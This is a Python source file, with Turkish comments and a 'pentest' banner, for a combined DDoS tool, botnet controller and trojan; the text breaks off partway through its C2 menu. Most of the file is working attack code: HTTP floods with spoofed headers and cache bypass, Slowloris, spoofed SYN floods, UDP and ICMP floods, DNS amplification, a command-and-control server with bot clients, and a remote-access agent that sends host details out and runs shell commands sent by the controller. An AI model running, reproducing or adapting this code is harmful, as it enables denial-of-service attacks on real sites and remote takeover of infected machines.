#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██████╔╝██████╔╝██║   ██║███████╗
██║  ██║██╔══██╗██╔══██╗██║   ██║╚════██║
██████╔╝██║  ██║██║  ██║╚██████╔╝███████║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
         Advanced DDoS Tool - C2 + Botnet
         Authorized Pentest Use Only
"""

import socket
import threading
import random
import sys
import os
import time
import json
import hashlib
import base64
import requests
import urllib3
import ssl
import struct
import ipaddress
from datetime import datetime
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# KONFİGÜRASYON
# ============================================================
VERSION = "3.0.0"
BANNER = """
    ╔══════════════════════════════════════════════╗
    ║           WWW-DESTROYER v3.0                ║
    ║       Advanced Penetration Testing Suite     ║
    ║         Authorized Security Testing          ║
    ╚══════════════════════════════════════════════╝
"""

# C2 Konfigürasyonu
C2_HOST = "0.0.0.0"
C2_PORT = 4443
C2_PASSWORD = "pentest2026!"  # Değiştirin

# Varsayılan hedef
TARGET_URL = ""
TARGET_PORT = 80
THREAD_COUNT = 500
DURATION = 60

# User-Agent listesi
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

# ============================================================
# ÇEKİRDEK FONKSİYONLAR
# ============================================================

def clear_screen():
    os.system('clear') if os.name == 'posix' else os.system('cls')

def print_banner():
    clear_screen()
    print(BANNER)
    print(f"  [!] Version: {VERSION}")
    print(f"  [!] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("  [!] Authorized Security Testing Tool")
    print("\n" + "="*50 + "\n")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def resolve_target(target):
    """Hedef URL'yi çözümle"""
    global TARGET_URL, TARGET_PORT
    
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    
    parsed = urlparse(target)
    TARGET_URL = parsed.hostname or target
    
    if parsed.port:
        TARGET_PORT = parsed.port
    elif parsed.scheme == "https":
        TARGET_PORT = 443
    else:
        TARGET_PORT = 80
    
    try:
        ip = socket.gethostbyname(TARGET_URL)
        print(f"  [+] Target resolved: {TARGET_URL} -> {ip}")
        return ip
    except:
        print(f"  [-] Could not resolve {TARGET_URL}")
        return target

# ============================================================
# SALDIRI MODÜLLERİ - LAYER 7 (Application Layer)
# ============================================================

class HTTPFlood:
    """HTTP GET/POST Flood - Cloudflare ve WAF atlatma ile"""
    
    @staticmethod
    def attack(target_ip, target_host, port, duration):
        end_time = time.time() + duration
        sent = 0
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target_host)
                
                s.connect((target_ip, port))
                
                ua = random.choice(USER_AGENTS)
                paths = ["/", "/index.php", "/wp-admin/", "/admin/", "/login", 
                        "/api/", "/search", "/?page=1", "/contact", "/about",
                        "/products", "/category", "/blog", "/wp-login.php",
                        "/xmlrpc.php", "/?s=" + str(random.randint(1,99999))]
                
                path = random.choice(paths)
                referers = [f"https://www.google.com/search?q={random.randint(1,999)}",
                           f"https://facebook.com/sharer.php?u=http://{target_host}",
                           f"https://twitter.com/intent/tweet?url=http://{target_host}",
                           "https://www.bing.com/", "https://yahoo.com/"]
                
                # Cache bypass
                cache_buster = f"?{random.randint(1000000000, 9999999999)}"
                
                request = (
                    f"GET {path}{cache_buster} HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                    f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'tr-TR,tr;q=0.9', 'de-DE,de;q=0.9', 'fr-FR,fr;q=0.9'])}\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Referer: {random.choice(referers)}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"\r\n"
                )
                
                s.send(request.encode())
                try:
                    s.recv(1024)
                except:
                    pass
                
                s.close()
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r  [HTTP] Sent: {sent} requests", end="", flush=True)
                    
            except:
                pass
        
        return sent

    @staticmethod
    def post_flood(target_ip, target_host, port, duration):
        """HTTP POST ile form flood"""
        end_time = time.time() + duration
        sent = 0
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target_host)
                
                s.connect((target_ip, port))
                
                post_data = f"username=admin&password={random.randint(1000,9999)}&submit=Login"
                ua = random.choice(USER_AGENTS)
                
                request = (
                    f"POST /wp-login.php HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(post_data)}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"\r\n"
                    f"{post_data}"
                )
                
                s.send(request.encode())
                try:
                    s.recv(1024)
                except:
                    pass
                
                s.close()
                sent += 1
                
            except:
                pass
        
        return sent


class Slowloris:
    """Slowloris - Bağlantıları açık tutarak resource tüketme"""
    
    @staticmethod
    def attack(target_ip, target_host, port, duration):
        sockets = []
        end_time = time.time() + duration
        
        # Soketleri oluştur
        print(f"\n  [Slowloris] Opening connections to {target_host}:{port}...")
        
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target_host)
                
                s.connect((target_ip, port))
                
                ua = random.choice(USER_AGENTS)
                
                # Kısmi HTTP isteği gönder - header'ı bitirme
                s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target_host}\r\n".encode())
                s.send(f"User-Agent: {ua}\r\n".encode())
                s.send(f"Accept: text/html,*/*\r\n".encode())
                
                # Header'ı KASITLI olarak bitirme - sunucu beklemede kalır
                
                sockets.append(s)
                
            except:
                pass
        
        print(f"  [Slowloris] {len(sockets)} connections established")
        
        # Bağlantıları açık tut
        alive_start = time.time()
        while time.time() < end_time and time.time() - alive_start < duration:
            for s in sockets[:]:
                try:
                    # Header'a rastgele bir satır daha ekle - bağlantıyı canlı tut
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    try:
                        s.close()
                    except:
                        pass
                    sockets.remove(s)
                    
                    # Düşen bağlantıyı yenile
                    try:
                        ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ns.settimeout(10)
                        
                        if port == 443:
                            ctx = ssl.create_default_context()
                            ctx.check_hostname = False
                            ctx.verify_mode = ssl.CERT_NONE
                            ns = ctx.wrap_socket(ns, server_hostname=target_host)
                        
                        ns.connect((target_ip, port))
                        ns.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n".encode())
                        ns.send(f"Host: {target_host}\r\n".encode())
                        ns.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                        
                        sockets.append(ns)
                    except:
                        pass
            
            time.sleep(10)
            print(f"\r  [Slowloris] Active connections: {len(sockets)}", end="", flush=True)
        
        # Temizlik
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        return len(sockets)


# ============================================================
# SALDIRI MODÜLLERİ - LAYER 4 (Transport Layer)
# ============================================================

class SYNFlood:
    """SYN Flood - TCP handshake'i tamamlamadan saldırı"""
    
    @staticmethod
    def attack(target_ip, port, duration):
        """Raw socket ile SYN flood"""
        end_time = time.time() + duration
        sent = 0
        
        try:
            # Raw socket oluştur
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            while time.time() < end_time:
                try:
                    # IP Header
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        0x45,  # Version + IHL
                        0,     # DSCP
                        40,    # Total Length
                        random.randint(0, 65535),  # Identification
                        0x4000,  # Flags + Fragment Offset
                        64,    # TTL
                        6,     # Protocol (TCP)
                        0,     # Checksum (filled by kernel)
                        socket.inet_aton(source_ip),
                        socket.inet_aton(target_ip)
                    )
                    
                    # TCP Header (SYN flag ile)
                    tcp_header = struct.pack('!HHLLBBHHH',
                        random.randint(1024, 65535),  # Source Port
                        port,  # Destination Port
                        random.randint(0, 4294967295),  # Sequence Number
                        0,  # Acknowledgment Number
                        5 << 4,  # Data Offset
                        0x02,  # Flags (SYN)
                        65535,  # Window Size
                        0,  # Checksum (filled)
                        0  # Urgent Pointer
                    )
                    
                    packet = ip_header + tcp_header
                    s.sendto(packet, (target_ip, port))
                    sent += 1
                    
                    if sent % 1000 == 0:
                        print(f"\r  [SYN] Packets sent: {sent}", end="", flush=True)
                    
                    source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    
                except:
                    pass
                    
        except PermissionError:
            print("\n  [-] SYN Flood requires root. Using UDP flood instead.")
            UDPFlood.attack(target_ip, port, duration)
        except:
            pass
        
        return sent


class UDPFlood:
    """UDP Flood - Rastgele portlara UDP paketleri"""
    
    @staticmethod
    def attack(target_ip, port, duration):
        end_time = time.time() + duration
        sent = 0
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while time.time() < end_time:
                try:
                    # Rastgele boyutlarda veri gönder
                    data_size = random.randint(64, 1500)
                    data = os.urandom(data_size)
                    
                    # Rastgele portlar hedef al
                    target_port = random.choice([port, 80, 443, 53, 8080, 3306, 5432, 3389])
                    
                    s.sendto(data, (target_ip, target_port))
                    sent += 1
                    
                    if sent % 1000 == 0:
                        print(f"\r  [UDP] Packets sent: {sent}", end="", flush=True)
                        
                except:
                    pass
                    
            s.close()
        except:
            pass
        
        return sent


class ICMPFlood:
    """ICMP Flood - Ping of Death"""
    
    @staticmethod
    def attack(target_ip, port, duration):
        end_time = time.time() + duration
        sent = 0
        
        try:
            # ICMP raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            while time.time() < end_time:
                try:
                    # ICMP Echo Request (Type 8, Code 0)
                    icmp_type = 8
                    icmp_code = 0
                    icmp_checksum = 0
                    icmp_id = random.randint(0, 65535)
                    icmp_seq = random.randint(0, 65535)
                    
                    # Büyük payload - Ping of Death
                    payload = os.urandom(random.randint(64, 65500))
                    
                    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                    packet = header + payload
                    
                    # Checksum hesapla
                    checksum = 0
                    for i in range(0, len(packet), 2):
                        if i + 1 < len(packet):
                            w = (packet[i] << 8) + packet[i+1]
                            checksum += w
                    
                    checksum = (checksum >> 16) + (checksum & 0xFFFF)
                    checksum = ~checksum & 0xFFFF
                    
                    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                    packet = header + payload
                    
                    s.sendto(packet, (target_ip, 0))
                    sent += 1
                    
                    if sent % 100 == 0:
                        print(f"\r  [ICMP] Packets sent: {sent}", end="", flush=True)
                        
                except:
                    pass
                    
        except PermissionError:
            print("\n  [-] ICMP Flood requires root. Skipping.")
        except:
            pass
        
        return sent


# ============================================================
# DNS AMPLIFICATION
# ============================================================

class DNSAmplification:
    """DNS Amplification - Open DNS resolver kullanarak büyütme saldırısı"""
    
    # Bilinen açık DNS resolver'lar
    OPEN_DNS = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
        "208.67.222.222", "208.67.220.220", "4.2.2.1", "4.2.2.2",
        "8.26.56.26", "8.20.247.20", "64.6.64.6", "64.6.65.6",
    ]
    
    @staticmethod
    def attack(target_ip, port, duration):
        """DNS query ile reflection saldırısı"""
        end_time = time.time() + duration
        sent = 0
        
        domains = ["google.com", "facebook.com", "youtube.com", "yahoo.com", 
                   "amazon.com", "wikipedia.org", "twitter.com", "instagram.com",
                   "linkedin.com", "reddit.com", "netflix.com", "microsoft.com"]
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while time.time() < end_time:
                try:
                    dns_server = random.choice(DNSAmplification.OPEN_DNS)
                    domain = random.choice(domains)
                    
                    # DNS query oluştur (EDNS0 ile büyük yanıt için)
                    tid = random.randint(0, 65535)
                    flags = 0x0100  # Standard query
                    questions = 1
                    answer_rrs = 0
                    authority_rrs = 0
                    additional_rrs = 1
                    
                    dns_header = struct.pack('!HHHHHH', tid, flags, questions, answer_rrs, authority_rrs, additional_rrs)
                    
                    # Domain adını encode et
                    qname = b''
                    for part in domain.split('.'):
                        qname += bytes([len(part)]) + part.encode()
                    qname += b'\x00'
                    
                    qtype = 255  # ANY query - maksimum response
                    qclass = 1   # IN
                    
                    dns_query = dns_header + qname + struct.pack('!HH', qtype, qclass)
                    
                    # Source IP'yi spoof et (hedef IP)
                    s.sendto(dns_query, (dns_server, 53))
                    sent += 1
                    
                    if sent % 100 == 0:
                        print(f"\r  [DNS] Amplification packets: {sent}", end="", flush=True)
                        
                except:
                    pass
                    
        except:
            pass
        
        return sent


# ============================================================
# C2 SERVER (Command & Control)
# ============================================================

class C2Server:
    """C2 Sunucusu - Botnet yönetimi"""
    
    def __init__(self, host=C2_HOST, port=C2_PORT, password=C2_PASSWORD):
        self.host = host
        self.port = port
        self.password = password
        self.bots = {}
        self.running = False
        self.server_socket = None
        
    def start(self):
        """C2 sunucusunu başlat"""
        self.running = True
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(100)
            
            print(f"\n  [+] C2 Server started on {self.host}:{self.port}")
            print(f"  [+] Password: {self.password}")
            print(f"  [+] Waiting for bots...\n")
            
            # Bot dinleyici thread
            accept_thread = threading.Thread(target=self._accept_bots, daemon=True)
            accept_thread.start()
            
            # C2 komut konsolu
            self._console()
            
        except Exception as e:
            print(f"  [-] C2 Server error: {e}")
        finally:
            self.stop()
    
    def _accept_bots(self):
        """Bot bağlantılarını kabul et"""
        while self.running:
            try:
                client, addr = self.server_socket.accept()
                bot_id = f"bot_{random.randint(1000,9999)}_{int(time.time())}"
                
                # Kimlik doğrulama
                try:
                    auth_data = client.recv(1024).decode().strip()
                    if auth_data == self.password:
                        self.bots[bot_id] = {
                            'socket': client,
                            'address': addr,
                            'connected': datetime.now(),
                            'last_seen': time.time(),
                            'status': 'idle'
                        }
                        client.send(b"AUTH_OK")
                        print(f"\n  [+] Bot connected: {bot_id} from {addr[0]}:{addr[1]}")
                        
                        # Bot handler thread
                        handler = threading.Thread(target=self._handle_bot, args=(bot_id, client), daemon=True)
                        handler.start()
                    else:
                        client.send(b"AUTH_FAIL")
                        client.close()
                except:
                    client.close()
            except:
                break
    
    def _handle_bot(self, bot_id, client_socket):
        """Bot ile iletişim"""
        while self.running and bot_id in self.bots:
            try:
                data = client_socket.recv(1024)
                if not data:
                    break
                
                msg = data.decode().strip()
                if msg == "PING":
                    self.bots[bot_id]['last_seen'] = time.time()
                    client_socket.send(b"PONG")
                elif msg.startswith("RESULT:"):
                    result = msg[7:]
                    print(f"\n  [Bot Report] {bot_id}: {result}")
                    
            except:
                break
        
        self._remove_bot(bot_id)
    
    def _remove_bot(self, bot_id):
        """Bot'u kaldır"""
        if bot_id in self.bots:
            try:
                self.bots[bot_id]['socket'].close()
            except:
                pass
            del self.bots[bot_id]
            print(f"\n  [-] Bot disconnected: {bot_id}")
    
    def broadcast(self, command):
        """Tüm botlara komut gönder"""
        count = 0
        for bot_id, bot_info in list(self.bots.items()):
            try:
                bot_info['socket'].send(command.encode())
                count += 1
            except:
                self._remove_bot(bot_id)
        
        return count
    
    def _console(self):
        """C2 komut konsolu"""
        while self.running:
            try:
                cmd = input("\n[C2] # ").strip()
                
                if cmd == "exit":
                    self.running = False
                    break
                elif cmd == "help":
                    print("""
  C2 Commands:
    help           - Show this help
    bots           - List connected bots
    broadcast MSG  - Send message to all bots
    attack TARGET  - Launch attack from all bots
    stop           - Stop all attacks
    status         - Show botnet status
    exit           - Shutdown C2 server
                    """)
                elif cmd == "bots":
                    print(f"\n  Connected Bots: {len(self.bots)}")
                    for bot_id, info in self.bots.items():
                        print(f"    {bot_id} - {info['address'][0]}:{info['address'][1]} - {info['status']}")
                
                elif cmd.startswith("broadcast "):
                    msg = cmd[10:]
                    count = self.broadcast(msg)
                    print(f"  [+] Message sent to {count} bots")
                
                elif cmd.startswith("attack "):
                    target = cmd[7:]
                    count = self.broadcast(f"ATTACK:{target}")
                    print(f"  [+] Attack command sent to {count} bots -> {target}")
                    self._update_all_status("attacking")
                
                elif cmd == "stop":
                    count = self.broadcast("STOP")
                    print(f"  [+] Stop command sent to {count} bots")
                    self._update_all_status("idle")
                
                elif cmd == "status":
                    print(f"\n  Botnet Status:")
                    print(f"    Total bots: {len(self.bots)}")
                    online = sum(1 for b in self.bots.values() if time.time() - b['last_seen'] < 30)
                    print(f"    Online: {online}")
                    attacking = sum(1 for b in self.bots.values() if b['status'] == 'attacking')
                    print(f"    Attacking: {attacking}")
                    idle = sum(1 for b in self.bots.values() if b['status'] == 'idle')
                    print(f"    Idle: {idle}")
                
                else:
                    print(f"  [-] Unknown command: {cmd}")
                    
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                print(f"  [-] Error: {e}")
    
    def _update_all_status(self, status):
        """Tüm botların durumunu güncelle"""
        for bot_id in self.bots:
            self.bots[bot_id]['status'] = status
    
    def stop(self):
        """Sunucuyu durdur"""
        self.running = False
        for bot_id in list(self.bots.keys()):
            self._remove_bot(bot_id)
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass


# ============================================================
# BOTNET BOT MODÜLÜ
# ============================================================

class BotClient:
    """Botnet bot - C2'ye bağlanan istemci"""
    
    def __init__(self, c2_host, c2_port, password):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.password = password
        self.socket = None
        self.running = False
        self.attack_target = None
        self.attack_thread = None
    
    def connect(self):
        """C2'ye bağlan"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.c2_host, self.c2_port))
            self.socket.send(self.password.encode())
            
            response = self.socket.recv(1024).decode()
            if response == "AUTH_OK":
                print(f"  [+] Connected to C2: {self.c2_host}:{self.c2_port}")
                self.running = True
                return True
            else:
                print(f"  [-] Authentication failed")
                return False
                
        except Exception as e:
            print(f"  [-] Connection failed: {e}")
            return False
    
    def listen(self):
        """C2'den komut bekle"""
        while self.running:
            try:
                data = self.socket.recv(1024)
                if not data:
                    break
                
                command = data.decode().strip()
                
                if command == "PING":
                    pass  # Handled by heartbeat
                elif command.startswith("ATTACK:"):
                    self.attack_target = command[7:]
                    print(f"\n  [!] Attack command received -> {self.attack_target}")
                    self._start_attack()
                elif command == "STOP":
                    print(f"\n  [!] Stop command received")
                    self._stop_attack()
                elif command:
                    print(f"\n  [C2] {command}")
                    
            except:
                break
        
        self.running = False
    
    def _start_attack(self):
        """Saldırı başlat"""
        if self.attack_target and (not self.attack_thread or not self.attack_thread.is_alive()):
            self.attack_thread = threading.Thread(
                target=self._attack_worker,
                args=(self.attack_target,),
                daemon=True
            )
            self.attack_thread.start()
    
    def _attack_worker(self, target):
        """Saldırı işçisi"""
        target_ip = resolve_target(target)
        print(f"  [!] Attacking {target} ({target_ip})")
        
        # Çoklu saldırı vektörleri
        threads = []
        
        # HTTP Flood
        for _ in range(20):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_ip, TARGET_URL, TARGET_PORT, 120))
            threads.append(t)
            t.start()
        
        # UDP Flood
        for _ in range(10):
            t = threading.Thread(target=UDPFlood.attack, args=(target_ip, 80, 120))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # Sonuç bildir
        try:
            self.socket.send(f"RESULT:Attack completed on {target}".encode())
        except:
            pass
    
    def _stop_attack(self):
        """Saldırıyı durdur"""
        self.attack_target = None
    
    def heartbeat(self):
        """Canlılık sinyali gönder"""
        while self.running:
            try:
                self.socket.send(b"PING")
                time.sleep(15)
            except:
                break
    
    def start(self):
        """Bot'u başlat"""
        if self.connect():
            threads = [
                threading.Thread(target=self.listen, daemon=True),
                threading.Thread(target=self.heartbeat, daemon=True)
            ]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
    
    def stop(self):
        """Bot'u durdur"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass


# ============================================================
# TROJAN / RAT MODÜLÜ
# ============================================================

class TrojanAgent:
    """Trojan - Uzaktan kontrol ve veri toplama"""
    
    def __init__(self, c2_host, c2_port, password):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.password = password
        self.running = False
        self.socket = None
        self.system_info = {}
        
    def gather_system_info(self):
        """Sistem bilgisi topla"""
        info = {}
        
        try:
            import platform
            info['os'] = platform.system()
            info['os_version'] = platform.version()
            info['architecture'] = platform.machine()
            info['hostname'] = socket.gethostname()
            info['cpu_count'] = os.cpu_count()
            
            # Ağ bilgisi
            try:
                import netifaces
                interfaces = netifaces.interfaces()
                info['interfaces'] = []
                for iface in interfaces:
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            info['interfaces'].append({'interface': iface, 'ip': addr['addr']})
            except:
                info['local_ip'] = get_local_ip()
            
            self.system_info = info
            return info
            
        except Exception as e:
            return {'error': str(e)}
    
    def exfiltrate(self, data):
        """C2'ye veri gönder"""
        try:
            if self.socket:
                encoded = base64.b64encode(json.dumps(data).encode()).decode()
                self.socket.send(f"EXFIL:{encoded}".encode())
        except:
            pass
    
    def connect_and_execute(self):
        """C2'ye bağlan ve komutları dinle"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.c2_host, self.c2_port))
            self.socket.send(self.password.encode())
            
            auth = self.socket.recv(1024).decode()
            if auth == "AUTH_OK":
                self.running = True
                print(f"  [+] Trojan connected to {self.c2_host}:{self.c2_port}")
                
                # Sistem bilgisini gönder
                info = self.gather_system_info()
                self.exfiltrate(info)
                
                # Komut dinle
                while self.running:
                    try:
                        data = self.socket.recv(4096)
                        if not data:
                            break
                        
                        command = data.decode().strip()
                        
                        if command.startswith("SHELL:"):
                            cmd = command[6:]
                            result = os.popen(cmd).read()
                            self.socket.send(f"OUTPUT:{result[:4000]}".encode())
                        
                        elif command == "GET_INFO":
                            self.exfiltrate(self.gather_system_info())
                        
                        elif command == "DISCONNECT":
                            self.running = False
                        
                    except:
                        break
            
        except Exception as e:
            print(f"  [-] Trojan error: {e}")
        finally:
            self.running = False
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass


# ============================================================
# ANA MENÜ
# ============================================================

def menu_attack(target):
    """Saldırı menüsü"""
    print_banner()
    print(f"\n  Target: {target}")
    print(f"  Resolved IP: {resolve_target(target)}\n")
    
    print("  [1] HTTP/HTTPS Flood (Layer 7)")
    print("  [2] SYN Flood (Layer 4) - Requires Root")
    print("  [3] UDP Flood (Layer 4)")
    print("  [4] ICMP/Ping Flood (Layer 3)")
    print("  [5] Slowloris (Keep connections open)")
    print("  [6] DNS Amplification")
    print("  [7] HEPSİ BİRDEN - Full Power")
    print("  [8] Custom Configuration")
    print("  [0] Back")
    
    choice = input("\n  Select attack mode: ").strip()
    
    if choice == "0":
        return
    
    try:
        threads = int(input("  Thread count (default 500): ").strip() or "500")
        duration = int(input("  Duration in seconds (default 60): ").strip() or "60")
    except:
        threads = 500
        duration = 60
    
    target_ip = resolve_target(target)
    port = TARGET_PORT
    
    print(f"\n  [!] Starting attack on {target} ({target_ip}:{port})")
    print(f"  [!] Threads: {threads} | Duration: {duration}s\n")
    
    attack_threads = []
    start_time = time.time()
    
    if choice == "1":
        for i in range(threads):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_ip, TARGET_URL, port, duration))
            attack_threads.append(t)
            t.start()
    
    elif choice == "2":
        t = threading.Thread(target=SYNFlood.attack, args=(target_ip, port, duration))
        attack_threads.append(t)
        t.start()
    
    elif choice == "3":
        for i in range(min(threads, 100)):
            t = threading.Thread(target=UDPFlood.attack, args=(target_ip, port, duration))
            attack_threads.append(t)
            t.start()
    
    elif choice == "4":
        t = threading.Thread(target=ICMPFlood.attack, args=(target_ip, port, duration))
        attack_threads.append(t)
        t.start()
    
    elif choice == "5":
        t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_URL, port, duration))
        attack_threads.append(t)
        t.start()
    
    elif choice == "6":
        t = threading.Thread(target=DNSAmplification.attack, args=(target_ip, port, duration))
        attack_threads.append(t)
        t.start()
    
    elif choice == "7":
        # Full power - tüm vektörler aynı anda
        print("  [!] FULL POWER MODE - All vectors engaged!\n")
        
        # HTTP Flood threads
        for i in range(threads // 2):
            t = threading.Thread(target=HTTPFlood.attack, args=(target_ip, TARGET_URL, port, duration))
            attack_threads.append(t)
            t.start()
        
        # UDP Flood
        t = threading.Thread(target=UDPFlood.attack, args=(target_ip, port, duration))
        attack_threads.append(t)
        t.start()
        
        # Slowloris
        t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_URL, port, duration))
        attack_threads.append(t)
        t.start()
        
        # DNS Amplification
        t = threading.Thread(target=DNSAmplification.attack, args=(target_ip, port, duration))
        attack_threads.append(t)
        t.start()
        
        # SYN Flood
        t = threading.Thread(target=SYNFlood.attack, args=(target_ip, port, duration))
        attack_threads.append(t)
        t.start()
    
    elif choice == "8":
        print("\n  Custom attack configuration:")
        print("  [a] HTTP + UDP")
        print("  [b] HTTP + Slowloris")
        print("  [c] All Layer 7 attacks")
        print("  [d] All Layer 4 attacks")
        
        sub = input("  Select: ").strip()
        
        if sub == "a":
            for i in range(threads // 2):
                t = threading.Thread(target=HTTPFlood.attack, args=(target_ip, TARGET_URL, port, duration))
                attack_threads.append(t)
                t.start()
            t = threading.Thread(target=UDPFlood.attack, args=(target_ip, port, duration))
            attack_threads.append(t)
            t.start()
        elif sub == "b":
            for i in range(threads // 2):
                t = threading.Thread(target=HTTPFlood.attack, args=(target_ip, TARGET_URL, port, duration))
                attack_threads.append(t)
                t.start()
            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_URL, port, duration))
            attack_threads.append(t)
            t.start()
        elif sub == "c":
            for i in range(threads // 3):
                t = threading.Thread(target=HTTPFlood.attack, args=(target_ip, TARGET_URL, port, duration))
                attack_threads.append(t)
                t.start()
            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_URL, port, duration))
            attack_threads.append(t)
            t.start()
        else:
            print("  Invalid choice")
            return
    
    # Progress tracker
    for t in attack_threads:
        t.join()
    
    elapsed = time.time() - start_time
    print(f"\n\n  [+] Attack completed!")
    print(f"  [+] Duration: {elapsed:.2f}s")
    print(f"  [+] Target: {target}")
    print(f"  [+] Total threads used: {len(attack_threads)}")


def menu_c2():
    """C2 sunucusu menüsü"""
    print_banner()
    print("\n  C2 Server - Command & Control Center\n")
    print("  [1] Start C2 Server (Host)")
    print("  [2] Start Bot Client (Connect to C2)")
    print("  [3] Start Trojan Agent (Full RAT)")
    print("  [0] Back")
    
    choice = input("\n  Select: ").strip()
    
    if choice == "1":
        host = input("  Bind IP (default 0.0.0.0): ").strip() or "0.0.0.0"
        port = int(input("  Port (default 4443): ").strip() or "4443")
        password = input("  Password (default pentest2026!): ").strip() or "pentest2026!"
        
        c2 = C2Server(host, port, password)
        c2.start()
    
    elif choice == "2":
